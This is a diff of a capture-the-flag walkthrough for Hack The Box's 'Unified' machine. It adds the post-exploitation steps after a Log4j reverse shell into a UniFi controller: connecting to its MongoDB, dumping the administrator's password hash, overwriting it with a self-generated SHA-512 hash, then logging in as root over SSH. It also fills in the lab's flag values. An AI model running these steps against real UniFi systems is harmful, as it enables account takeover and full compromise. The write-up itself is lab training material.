@@ -175,13 +175,81 @@ $ cd Log4jUnifi
 $ python3 exploit.py -u http://{IP}:8443 -i {MyIP} -p {remote-port}
 
 script /dev/null -c bash
-shell> 
+shell>
+```
+
+---
+
+## CONNECTION TO THE MONGODB DBMS
+
+- Now that we have a shell inside the system let's list all the running processes
+
+```bash
+shell> ps -aux
+```
+
+- We can see that there is a running process named `mongo` on port 27117
+- MonoDB is a really famous DataBase Management System
+- Let's connect to the DBMS
+
+```bash
+shell> mongo localhost:27117
+mongo> show dbs
+mongo> use ace
+mongo> show collections
+mongo> db.admin.find()
+
+...
+"_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", 
+"email" : "administrator@unified.htb", 
+"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0Pv" \
+"Uc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."
+...
+
+```
+
+- The previous is an entry referring the administrator password
+- Since we have access to the database, we could change that password
+- To do this, we need to create the corresponding SHA-512 Hash
+
+```bash
+$ mkpasswd -m sha-512 Password123
+$6$/JqfWcsd4dtGIXc6$Cgp2uRUwkcnqG.DKlRbZba72.3FRU3ofeU5HPGenwMXQtnW
+Dhe4y6AJFxKCTF/uieloRvqGPI7zydd94fS.C51
+```
+
+- Now, we can update the password for the administrator
+
+```bash
+mongo> db.admin.update({"_id" : ObjectId("61ce278f46e0fb0012d47ee4")}, \
+    {$set:{"x_shadow" : "$6$/JqfWcsd4dtGIXc6$Cgp2uRUwkcnqG.DKlRbZba72.3F" \
+    "RU3ofeU5HPGenwMXQtnWDhe4y6AJFxKCTF/uieloRvqGPI7zydd94fS.C51"}});
+```
+
+---
+
+## LOGIN AS THE ADMINISTRATOR
+
+- Now that we have changed the password, let go back to the site and login as the admin
+- Once we are logged in go to Settings and find the SSH login
+
+```
+USERNAME: root
+PASSWORD: NotACrackablePassword4U2022
+```
+
+- Finally, use SSH to login
+
+```bash
+$ ssh root@{IP} -p 22
+$ cat /root/root.txt
+e50bc93c75b634e4b272d2f771c33681
 ```
 
 ---
 
 ## FLAGS
 
-USER: 
+USER: 6ced1a6a89e666c0620cdb10262ba127
 
-ROOT: 
+ROOT: e50bc93c75b634e4b272d2f771c33681
